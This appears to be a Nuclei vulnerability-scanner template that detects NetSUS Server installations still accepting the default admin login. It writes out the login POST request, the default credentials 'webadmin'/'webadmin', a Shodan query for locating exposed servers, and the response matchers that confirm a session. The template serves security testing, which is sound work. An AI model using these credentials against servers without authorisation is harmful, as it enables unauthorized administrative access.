id: netsus-default-login

info:
  name: NetSUS Server Default Login
  author: princechaddha
  severity: high
  description: NetSUS Server default admin credentials were discovered.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
    shodan-query: http.title:"NetSUS Server Login"
  tags: netsus,default-login,vuln

http:
  - raw:
      - |
        POST /webadmin/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        loginwith=suslogin&username={{username}}&password={{password}}&submit=

    attack: pitchfork
    payloads:
      username:
        - webadmin
      password:
        - webadmin

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'Location: dashboard.php'
          - 'PHPSESSID='
        condition: and

      - type: status
        status:
          - 302
